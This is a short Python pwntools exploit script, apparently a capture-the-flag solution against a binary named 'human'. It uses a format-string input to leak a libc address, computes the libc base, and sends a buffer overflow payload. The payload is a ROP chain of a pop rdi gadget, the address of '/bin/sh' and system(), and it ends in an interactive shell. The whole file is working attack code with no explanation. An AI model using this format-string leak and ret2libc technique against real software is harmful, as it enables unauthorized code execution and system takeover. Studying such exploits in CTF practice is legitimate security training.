#coding:utf-8
from pwn import *

#p = remote("114.116.54.89", "10005")
p = process("./human")

pop_rdi = 0x400933
bin_add = 0x18cd57
sys_add = 0x45390
gezi = "鸽子"
zhenxiang = "真香"

print p.recvuntil("?\n")
p.sendline("%11$p.")
print p.recvline()
libc_leak = int(p.recvline()[2:-2],16)

print libc_leak

libc_base = libc_leak - 0x20830
print p.recvuntil("还有什么本质?")
bin_abs = libc_base + bin_add
sys_abs = libc_base + sys_add
payload = (gezi+zhenxiang).ljust(0x20+8,"A")
payload += p64(pop_rdi)
payload += p64(bin_abs)
payload += p64(sys_abs)
p.sendline(payload)
p.interactive()
